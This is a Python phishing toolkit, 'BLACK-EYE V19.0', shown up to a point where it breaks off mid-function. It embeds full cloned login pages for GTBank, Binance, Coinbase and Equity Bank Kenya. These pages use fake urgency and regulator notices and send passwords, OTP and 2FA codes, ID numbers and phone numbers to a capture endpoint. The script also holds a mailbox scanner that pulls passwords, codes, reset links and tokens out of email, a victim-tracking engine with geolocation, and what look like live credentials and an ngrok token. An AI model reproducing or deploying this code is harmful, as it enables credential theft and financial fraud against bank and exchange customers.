#!/usr/bin/env python3
"""
BLACK-EYE V19.0 - COMPLETE PHISHING PAGES EDITION
================================================================
✅ REAL Working Phishing Pages (Not Just Redirects!)
✅ Binance, Coinbase, Kraken Exchange Clones
✅ Bank Login Pages (GTBank, Equity, KCB)
✅ Universal Email Scanner & Intelligence
✅ Device Fingerprinting & Geolocation
✅ Advanced Password Extraction from Email
✅ URGENT Panic-Inducing Email Templates
✅ Smart Timing for Peak Hours
✅ Automatic Follow-up Emails
================================================================
"""
import os,subprocess,time,threading,requests,smtplib,sys,re,json,socket,imaplib,email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formataddr, make_msgid
from email.header import decode_header
from datetime import datetime, timedelta
from collections import defaultdict
import hashlib

print("⚙️  Installing dependencies...")
os.system("pip install requests pyngrok flask -q 2>/dev/null")
os.system("apt-get update -qq >/dev/null 2>&1 && apt-get install -y php whois -qq >/dev/null 2>&1")
print("✅ Ready!\n")

# ============ CONFIGURATION ============
PORT = int(os.environ.get("PORT", 3333))
USE_NGROK = os.environ.get("USE_NGROK", "true").lower() == "true"
NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "36DRCPl5Q5I1lOz5bZ3pRwVndvg_2JnisGte7TiaMbFbHPRtc")

EMAIL_TO = os.environ.get("EMAIL_TO", "felixkoskey278@gmail.com")
EMAIL_FROM = os.environ.get("EMAIL_FROM", "felixkoskey278@gmail.com")
EMAIL_PASS = os.environ.get("EMAIL_APP_PASSWORD", "ntsu adxv tfgw ptpj")

IMAP_SERVER = os.environ.get("IMAP_SERVER", "imap.gmail.com")
IMAP_PORT = int(os.environ.get("IMAP_PORT", 993))
ENABLE_EMAIL_SCANNING = os.environ.get("ENABLE_EMAIL_SCANNING", "true").lower() == "true"

ENABLE_DEEP_INTELLIGENCE = True
ENABLE_AUTO_REPORTS = True
REPORT_INTERVAL_MINUTES = 30
ENABLE_GEOLOCATION = True
ENABLE_DEVICE_FINGERPRINT = True

PEAK_HOURS = {
    'morning': (7, 9),
    'lunch': (12, 13),
    'evening': (17, 19),
    'night': (21, 22)
}

ENABLE_SMART_TIMING = True
SEND_FOLLOW_UP = True
FOLLOW_UP_DELAY_HOURS = 2

PUBLIC_URL = None

class c:
    R='\033[91m';G='\033[92m';Y='\033[93m';C='\033[96m';M='\033[95m';B='\033[1m';E='\033[0m'

# ============ COMPLETE PHISHING PAGE TEMPLATES ============

PHISHING_PAGES = {
    'gtbank': '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GTBank - Account Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%);
            padding: 40px 30px;
            text-align: center;
            color: white;
        }
        .header h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 15px;
        }
        .alert-banner {
            background: #ff0000;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: 600;
            font-size: 14px;
        }
        .content {
            padding: 40px 30px;
        }
        .warning {
            background: #fff3cd;
            border-left: 5px solid #ff0000;
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 5px;
        }
        .warning h3 {
            color: #ff0000;
            margin-bottom: 10px;
            font-size: 18px;
        }
        .warning p {
            color: #856404;
            font-size: 14px;
            line-height: 1.6;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #FF6B00;
            box-shadow: 0 0 0 3px rgba(255,107,0,0.1);
        }
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(255,107,0,0.3);
        }
        .footer {
            background: #f8f9fa;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
        .countdown {
            background: #000;
            color: #fff;
            padding: 15px;
            text-align: center;
            border-radius: 8px;
            margin-bottom: 25px;
        }
        .countdown .time {
            font-size: 28px;
            font-weight: 700;
            color: #ff0000;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #FF6B00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🏦</div>
            <h1>GTBank</h1>
            <p>Account Security Verification</p>
        </div>
        
        <div class="alert-banner">
            ⚠️ URGENT: Verify your account within 24 hours
        </div>
        
        <div class="content">
            <div class="warning">
                <h3>⚠️ Security Alert</h3>
                <p>We detected suspicious activity on your account. Please verify your identity to prevent suspension.</p>
            </div>
            
            <div class="countdown">
                <p style="margin-bottom: 10px; font-size: 14px;">Time Remaining</p>
                <div class="time">23:45:12</div>
            </div>
            
            <form id="verifyForm">
                <div class="form-group">
                    <label>Account Number / User ID</label>
                    <input type="text" name="account" id="account" required placeholder="Enter your account number">
                </div>
                
                <div class="form-group">
                    <label>Internet Banking Password</label>
                    <input type="password" name="password" id="password" required placeholder="Enter your password">
                </div>
                
                <div class="form-group">
                    <label>Token / OTP (if applicable)</label>
                    <input type="text" name="token" id="token" placeholder="Enter token or OTP">
                </div>
                
                <button type="submit" class="submit-btn">🔐 Verify Account Now</button>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="margin-top: 15px; color: #666;">Verifying your account...</p>
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Guaranty Trust Bank Plc</strong></p>
            <p>Protected by 256-bit SSL Encryption</p>
            <p style="margin-top: 10px; opacity: 0.7;">For assistance: 0700GTCONNECT</p>
        </div>
    </div>
    
    <script>
        document.getElementById('verifyForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            formData.forEach((value, key) => data[key] = value);
            
            // Add metadata
            data.bank_type = 'gtbank';
            data.timestamp = new Date().toISOString();
            data.user_agent = navigator.userAgent;
            data.screen_resolution = screen.width + 'x' + screen.height;
            data.language = navigator.language;
            
            // Show loading
            form.style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Send to capture endpoint
            fetch('capture.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.gtbank.com';
                }, 2000);
            })
            .catch(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.gtbank.com';
                }, 2000);
            });
        });
        
        // Countdown timer
        let seconds = 86112; // 23:55:12
        setInterval(() => {
            seconds--;
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = seconds % 60;
            document.querySelector('.countdown .time').textContent = 
                String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
        }, 1000);
    </script>
</body>
</html>''',

    'binance': '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance - Security Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #0B0E11;
            color: #EAECEF;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #1E2329;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #F0B90B 0%, #FCD535 100%);
            padding: 30px;
            text-align: center;
        }
        .logo {
            font-size: 42px;
            font-weight: 700;
            color: #0B0E11;
            margin-bottom: 10px;
        }
        .header h2 {
            color: #0B0E11;
            font-size: 24px;
            font-weight: 600;
        }
        .alert-banner {
            background: #F6465D;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: 600;
        }
        .content {
            padding: 35px 30px;
        }
        .security-notice {
            background: rgba(246,70,93,0.1);
            border-left: 4px solid #F6465D;
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 8px;
        }
        .security-notice h3 {
            color: #F6465D;
            margin-bottom: 10px;
            font-size: 18px;
        }
        .security-notice p {
            color: #EAECEF;
            font-size: 14px;
            line-height: 1.6;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #EAECEF;
            font-weight: 500;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px;
            background: #0B0E11;
            border: 1px solid #2B3139;
            border-radius: 8px;
            color: #EAECEF;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #F0B90B;
            box-shadow: 0 0 0 3px rgba(240,185,11,0.1);
        }
        input::placeholder {
            color: #848E9C;
        }
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #F0B90B 0%, #FCD535 100%);
            color: #0B0E11;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(240,185,11,0.3);
        }
        .info-box {
            background: rgba(240,185,11,0.1);
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            font-size: 13px;
            color: #848E9C;
        }
        .footer {
            background: #0B0E11;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #848E9C;
        }
        .risk-level {
            background: #F6465D;
            color: white;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: 700;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 30px;
        }
        .spinner {
            border: 3px solid #2B3139;
            border-top: 3px solid #F0B90B;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">BINANCE</div>
            <h2>Security Verification</h2>
        </div>
        
        <div class="alert-banner">
            🚨 URGENT: Suspicious Activity Detected on Your Account
        </div>
        
        <div class="content">
            <div class="security-notice">
                <h3>⚠️ Account Security Alert</h3>
                <p>We've detected unusual withdrawal activity from an unrecognized location. Your account has been temporarily restricted for your protection.</p>
            </div>
            
            <div class="risk-level">
                🔴 RISK LEVEL: HIGH - Immediate Verification Required
            </div>
            
            <form id="verifyForm">
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="email" required placeholder="Enter your email">
                </div>
                
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required placeholder="Enter your password">
                </div>
                
                <div class="form-group">
                    <label>2FA Code (if enabled)</label>
                    <input type="text" name="2fa_code" placeholder="Enter 2FA code" maxlength="6">
                </div>
                
                <div class="form-group">
                    <label>Phone Number</label>
                    <input type="tel" name="phone" placeholder="Enter phone number">
                </div>
                
                <button type="submit" class="submit-btn">🔐 Verify and Unlock Account</button>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Verifying your identity...</p>
                <p style="font-size: 12px; margin-top: 10px; color: #848E9C;">This may take a few seconds</p>
            </div>
            
            <div class="info-box">
                <p>🔒 Your security is our priority. This verification helps protect your assets from unauthorized access.</p>
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Binance</strong> - The World's Leading Cryptocurrency Exchange</p>
            <p style="margin-top: 8px;">24/7 Customer Support Available</p>
        </div>
    </div>
    
    <script>
        document.getElementById('verifyForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = e.target;
            const formData = new FormData(form);
            const data = {exchange: 'binance'};
            formData.forEach((value, key) => data[key] = value);
            
            data.timestamp = new Date().toISOString();
            data.user_agent = navigator.userAgent;
            data.screen = screen.width + 'x' + screen.height;
            
            form.style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            fetch('capture.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.binance.com';
                }, 3000);
            })
            .catch(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.binance.com';
                }, 3000);
            });
        });
    </script>
</body>
</html>''',

    'coinbase': '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase - Account Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #F7FAFC;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: #0052FF;
            padding: 40px 30px;
            text-align: center;
            color: white;
        }
        .logo {
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        .header p {
            font-size: 16px;
            opacity: 0.9;
        }
        .alert-banner {
            background: #EF4444;
            color: white;
            padding: 12px 20px;
            text-align: center;
            font-size: 14px;
            font-weight: 600;
        }
        .content {
            padding: 35px 30px;
        }
        .warning-box {
            background: #FEF3C7;
            border-left: 4px solid #F59E0B;
            padding: 20px;
            margin-bottom: 25px;
            border-radius: 6px;
        }
        .warning-box h3 {
            color: #92400E;
            font-size: 16px;
            margin-bottom: 8px;
        }
        .warning-box p {
            color: #78350F;
            font-size: 14px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #1F2937;
            font-weight: 600;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            border: 1.5px solid #D1D5DB;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #0052FF;
            box-shadow: 0 0 0 3px rgba(0,82,255,0.1);
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #0052FF;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .submit-btn:hover {
            background: #0041CC;
            transform: translateY(-1px);
        }
        .footer {
            background: #F9FAFB;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #6B7280;
        }
        .security-badge {
            display: inline-flex;
            align-items: center;
            background: #DBEAFE;
            color: #1E40AF;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            margin: 15px 0;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 30px;
        }
        .spinner {
            border: 3px solid #E5E7EB;
            border-top: 3px solid #0052FF;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">coinbase</div>
            <p>Secure Account Verification</p>
        </div>
        
        <div class="alert-banner">
            ⚠️ Account access limited - Verification required
        </div>
        
        <div class="content">
            <div class="warning-box">
                <h3>⚠️ Account Under Review</h3>
                <p>We've detected activity that violates our terms of service. Your account has been temporarily restricted. Please verify your identity to restore full access.</p>
            </div>
            
            <div class="security-badge">
                🔒 256-bit SSL Encrypted
            </div>
            
            <form id="verifyForm">
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="email" required placeholder="your@email.com">
                </div>
                
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required placeholder="Enter your password">
                </div>
                
                <div class="form-group">
                    <label>Phone Number</label>
                    <input type="tel" name="phone" placeholder="+1 (555) 123-4567">
                </div>
                
                <div class="form-group">
                    <label>2-Step Verification Code</label>
                    <input type="text" name="2fa" placeholder="6-digit code" maxlength="6">
                </div>
                
                <button type="submit" class="submit-btn">Verify Account</button>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="color: #6B7280;">Verifying your account...</p>
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Coinbase, Inc.</strong></p>
            <p style="margin-top: 5px;">Protected by industry-leading security</p>
        </div>
    </div>
    
    <script>
        document.getElementById('verifyForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = e.target;
            const formData = new FormData(form);
            const data = {exchange: 'coinbase'};
            formData.forEach((value, key) => data[key] = value);
            
            data.timestamp = new Date().toISOString();
            data.user_agent = navigator.userAgent;
            
            form.style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            fetch('capture.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.coinbase.com';
                }, 2500);
            })
            .catch(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.coinbase.com';
                }, 2500);
            });
        });
    </script>
</body>
</html>''',

    'equity': '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Equity Bank - KYC Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #8B0000 0%, #C62828 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 460px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: #8B0000;
            padding: 35px 25px;
            text-align: center;
            color: white;
        }
        .header h1 {
            font-size: 28px;
            margin-bottom: 8px;
        }
        .header p {
            font-size: 14px;
            opacity: 0.95;
        }
        .cbk-badge {
            background: #FFD700;
            color: #000;
            padding: 10px 20px;
            font-weight: 700;
            text-align: center;
            font-size: 13px;
        }
        .content {
            padding: 30px 25px;
        }
        .alert {background: #FFEBEE;
            border-left: 5px solid #C62828;
            padding: 20px;
            margin-bottom: 25px;
            border-radius: 6px;
        }
        .alert h3 {
            color: #C62828;
            font-size: 17px;
            margin-bottom: 10px;
        }
        .alert p {
            color: #B71C1C;
            font-size: 14px;
            line-height: 1.5;
        }
        .deadline {
            background: #C62828;
            color: white;
            padding: 18px;
            text-align: center;
            border-radius: 8px;
            margin-bottom: 25px;
        }
        .deadline .time {
            font-size: 32px;
            font-weight: 700;
            margin: 8px 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 7px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 13px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #C62828;
            box-shadow: 0 0 0 3px rgba(198,40,40,0.1);
        }
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: #C62828;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
        }
        .submit-btn:hover {
            background: #A52222;
            transform: translateY(-2px);
        }
        .footer {
            background: #F5F5F5;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 30px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #C62828;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Equity Bank Kenya</h1>
            <p>CBK Compliance Verification</p>
        </div>
        
        <div class="cbk-badge">
            ⚠️ CENTRAL BANK DIRECTIVE 2026/01
        </div>
        
        <div class="content">
            <div class="alert">
                <h3>⚠️ MANDATORY KYC UPDATE</h3>
                <p>As per Central Bank of Kenya directive, all customers must complete Enhanced KYC verification to maintain account access.</p>
            </div>
            
            <div class="deadline">
                <p style="font-size: 13px; margin-bottom: 5px;">Compliance Deadline</p>
                <div class="time">48 HOURS</div>
            </div>
            
            <form id="verifyForm">
                <div class="form-group">
                    <label>Account Number</label>
                    <input type="text" name="account" required placeholder="Enter account number">
                </div>
                
                <div class="form-group">
                    <label>Internet Banking Password</label>
                    <input type="password" name="password" required placeholder="Enter password">
                </div>
                
                <div class="form-group">
                    <label>ID Number</label>
                    <input type="text" name="id_number" placeholder="National ID / Passport">
                </div>
                
                <div class="form-group">
                    <label>Phone Number</label>
                    <input type="tel" name="phone" placeholder="07XX XXX XXX">
                </div>
                
                <button type="submit" class="submit-btn">🔐 Complete KYC Verification</button>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="color: #666;">Processing verification...</p>
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Equity Bank Kenya Limited</strong></p>
            <p>Compliance & Regulatory Affairs Department</p>
        </div>
    </div>
    
    <script>
        document.getElementById('verifyForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = e.target;
            const formData = new FormData(form);
            const data = {bank_type: 'equity'};
            formData.forEach((value, key) => data[key] = value);
            
            data.timestamp = new Date().toISOString();
            data.user_agent = navigator.userAgent;
            
            form.style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            fetch('capture.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.equitybank.co.ke';
                }, 2000);
            })
            .catch(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.equitybank.co.ke';
                }, 2000);
            });
        });
        
        // Countdown
        let seconds = 172800;
        setInterval(() => {
            seconds--;
            const h = Math.floor(seconds / 3600);
            document.querySelector('.deadline .time').textContent = h + ' HOURS';
        }, 1000);
    </script>
</body>
</html>'''
}

# ============ REST OF YOUR ORIGINAL SCRIPT ============

class EmailPasswordExtractor:
    """Extract passwords and sensitive data from emails"""
    def __init__(self, email_addr, app_password):
        self.email = email_addr
        self.password = app_password
        self.patterns = {
            'password': [
                r'password[:\s]+([^\s\n]+)',
                r'pass[:\s]+([^\s\n]+)',
                r'pwd[:\s]+([^\s\n]+)',
                r'pin[:\s]+(\d{4,6})',
                r'otp[:\s]+(\d{4,8})',
                r'code[:\s]+(\d{4,8})',
                r'verification[:\s]+code[:\s]+(\d{4,8})',
            ],
            'credentials': [
                r'username[:\s]+([^\s\n]+)',
                r'email[:\s]+([^\s\n@]+@[^\s\n]+)',
                r'account[:\s]+([^\s\n]+)',
                r'user[:\s]+([^\s\n]+)',
            ],
            'reset_links': [
                r'(https?://[^\s]+reset[^\s]*)',
                r'(https?://[^\s]+password[^\s]*)',
                r'(https?://[^\s]+verify[^\s]*)',
            ],
            'tokens': [
                r'token[:\s]+([a-zA-Z0-9_\-]{20,})',
                r'api[_\s]key[:\s]+([a-zA-Z0-9_\-]{20,})',
            ]
        }
        self.extracted_data = []

    def connect(self):
        try:
            mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
            mail.login(self.email, self.password)
            return mail
        except Exception as e:
            print(f"{c.R}❌ IMAP Connection Failed: {e}{c.E}")
            return None

    def decode_subject(self, subject):
        if subject is None:
            return "No Subject"
        decoded = decode_header(subject)
        result = ""
        for part, encoding in decoded:
            if isinstance(part, bytes):
                try:
                    result += part.decode(encoding or 'utf-8', errors='ignore')
                except:
                    result += part.decode('utf-8', errors='ignore')
            else:
                result += str(part)
        return result

    def extract_body(self, message):
        body = ""
        if message.is_multipart():
            for part in message.walk():
                content_type = part.get_content_type()
                if content_type in ["text/plain", "text/html"]:
                    try:
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode('utf-8', errors='ignore')
                    except:
                        pass
        else:
            try:
                payload = message.get_payload(decode=True)
                if payload:
                    body = payload.decode('utf-8', errors='ignore')
            except:
                pass
        return body

    def extract_patterns(self, text, pattern_dict):
        results = {}
        for key, patterns in pattern_dict.items():
            matches = []
            for pattern in patterns:
                found = re.findall(pattern, text, re.IGNORECASE)
                matches.extend(found)
            if matches:
                results[key] = list(set(matches))
        return results

    def scan_emails(self, num_emails=50, search_keywords=None):
        mail = self.connect()
        if not mail:
            return []
        
        try:
            mail.select('INBOX', readonly=True)
            
            if search_keywords:
                search_query = f'OR {" ".join([f"SUBJECT {kw}" for kw in search_keywords])}'
            else:
                search_query = 'ALL'
            
            status, messages = mail.search(None, search_query)
            
            if status != 'OK':
                return []
            
            email_ids = messages[0].split()
            recent_ids = email_ids[-num_emails:] if len(email_ids) >= num_emails else email_ids
            recent_ids.reverse()
            
            print(f"\n{c.C}📧 Scanning {len(recent_ids)} emails for sensitive data...{c.E}\n")
            
            for i, email_id in enumerate(recent_ids, 1):
                try:
                    status, msg_data = mail.fetch(email_id, '(RFC822)')
                    if status != 'OK':
                        continue
                    
                    email_body = msg_data[0][1]
                    message = email.message_from_bytes(email_body)
                    
                    subject = self.decode_subject(message.get('Subject'))
                    from_email = message.get('From')
                    date = message.get('Date')
                    body = self.extract_body(message)
                    
                    full_text = f"{subject}\n{body}"
                    extracted = self.extract_patterns(full_text, self.patterns)
                    
                    if extracted:
                        data = {
                            'email_num': i,
                            'from': from_email,
                            'subject': subject,
                            'date': date,
                            'extracted': extracted,
                            'preview': body[:300] if body else ""
                        }
                        self.extracted_data.append(data)
                        print(f"{c.G}✓ [{i}] Found sensitive data in: {subject[:50]}...{c.E}")
                        
                except Exception as e:
                    continue
            
            mail.logout()
            return self.extracted_data
            
        except Exception as e:
            print(f"{c.R}❌ Scan Error: {e}{c.E}")
            return []

    def generate_report(self):
        if not self.extracted_data:
            return "No sensitive data found in scanned emails."
        
        report = f"""
╔═══════════════════════════════════════════════════════════════════╗
║           EMAIL PASSWORD EXTRACTION REPORT                         ║
║           {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                                  ║
╚═══════════════════════════════════════════════════════════════════╝

📊 SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Total Emails Scanned: {len(self.extracted_data)}
Emails with Sensitive Data: {len(self.extracted_data)}
Total Passwords Found: {sum(len(d['extracted'].get('password', [])) for d in self.extracted_data)}
Total Credentials Found: {sum(len(d['extracted'].get('credentials', [])) for d in self.extracted_data)}

"""
        
        for i, data in enumerate(self.extracted_data, 1):
            report += f"\n{'='*70}\n"
            report += f"EMAIL #{i}\n"
            report += f"{'='*70}\n"
            report += f"From: {data['from']}\n"
            report += f"Subject: {data['subject']}\n"
            report += f"Date: {data['date']}\n\n"
            
            for category, items in data['extracted'].items():
                if items:
                    report += f"  {category.upper()}:\n"
                    for item in items:
                        report += f"    • {item}\n"
            
            report += f"\n  Preview:\n    {data['preview'][:200]}...\n"
        
        report += "\n" + "═"*70 + "\n"
        report += "End of Email Extraction Report\n"
        report += "═"*70 + "\n"
        
        return report


class IntelligenceEngine:
    def __init__(self):
        self.captures = []
        self.email_database = defaultdict(list)
        self.ip_database = defaultdict(int)
        self.device_database = defaultdict(list)
        self.session_start = datetime.now()
        self.total_victims = 0
        self.unique_ips = set()
        self.unique_emails = set()

    def add_capture(self, data):
        capture = {
            'timestamp': datetime.now(),
            'data': data,
            'ip': data.get('ip', 'Unknown'),
            'device': data.get('device', {}),
            'geolocation': data.get('geo', {}),
            'email': self.extract_email(data)
        }
        
        self.captures.append(capture)
        self.total_victims += 1
        
        if capture['ip'] != 'Unknown':
            self.unique_ips.add(capture['ip'])
            self.ip_database[capture['ip']] += 1
        
        if capture['email']:
            self.unique_emails.add(capture['email'])
            self.email_database[capture['email']].append(capture)
        
        return capture

    def extract_email(self, data):
        for key in ['email', 'identifier', 'loginfmt', 'account_name', 'userid', 'appleId', 'signinId', 'account']:
            if key in data and '@' in str(data.get(key, '')):
                return data[key]
        return None

    def get_ip_intelligence(self, ip):
        if not ENABLE_GEOLOCATION or ip == 'Unknown':
            return {'ip': ip}
        
        try:
            response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'ip': ip,
                    'country': data.get('country_name', 'Unknown'),
                    'country_code': data.get('country_code', '??'),
                    'region': data.get('region', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('org', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
